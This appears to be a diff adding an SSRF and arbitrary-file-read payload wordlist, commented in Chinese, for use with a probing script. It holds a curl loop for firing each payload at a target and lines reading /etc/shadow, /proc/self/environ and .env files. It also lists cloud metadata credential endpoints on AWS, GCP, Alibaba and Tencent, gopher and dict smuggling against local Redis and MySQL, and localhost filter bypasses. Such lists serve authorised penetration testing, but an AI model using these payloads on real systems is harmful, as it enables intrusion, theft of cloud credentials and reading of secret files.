@@ -1,0 +1,57 @@
+# ssrf-payloads.txt — SSRF / 任意文件读取 payload 字典
+# 用法: bash tools/ssrf-probe.sh <target_dir> "<url_with___PAYLOAD__>"
+# 手动: while read p; do curl -sk "https://target.com/api?url=$(python -c "import urllib.parse;print(urllib.parse.quote('$p'))")" -i; done < wordlists/ssrf-payloads.txt
+# 注意: ssrf-probe.sh 已内置此列表,本文件供手动/自定义场景使用
+
+## ── 本地文件读取 ──
+file:///etc/passwd
+file:///etc/hosts
+file:///etc/shadow
+file:///proc/self/environ
+file:///proc/self/cmdline
+file:///proc/self/fd/0
+file:///proc/self/cwd/.env
+file:///windows/win.ini
+file:///windows/system32/drivers/etc/hosts
+
+## ── 云元数据 ──
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://metadata.google.internal/
+http://metadata.google.internal/computeMetadata/v1/
+http://100.100.100.200/latest/meta-data/
+http://metadata.tencentyun.com/
+http://metadata.tencentyun.com/latest/meta-data/
+
+## ── 内网服务探测 ──
+http://127.0.0.1/
+http://127.0.0.1:80/
+http://127.0.0.1:22/
+http://127.0.0.1:6379/
+http://127.0.0.1:3306/
+http://127.0.0.1:9200/
+http://127.0.0.1:8080/
+http://127.0.0.1:8443/
+http://localhost/
+http://0.0.0.0/
+http://[::1]/
+http://0x7f000001/
+
+## ── 协议走私 ──
+gopher://127.0.0.1:6379/_INFO
+gopher://127.0.0.1:3306/_SELECT%201
+dict://127.0.0.1:6379/info
+dict://127.0.0.1:6379/keys%20*
+ftp://127.0.0.1:21/
+sftp://127.0.0.1:22/
+ldap://127.0.0.1:389/
+
+## ── DNS Rebinding / 绕过 ──
+http://0177.0.0.1/
+http://0x7f.0.0.1/
+http://127.1/
+http://127.0.1/
+http://0/
+http://localtest.me/
+http://spoofed.burpcollaborator.net/
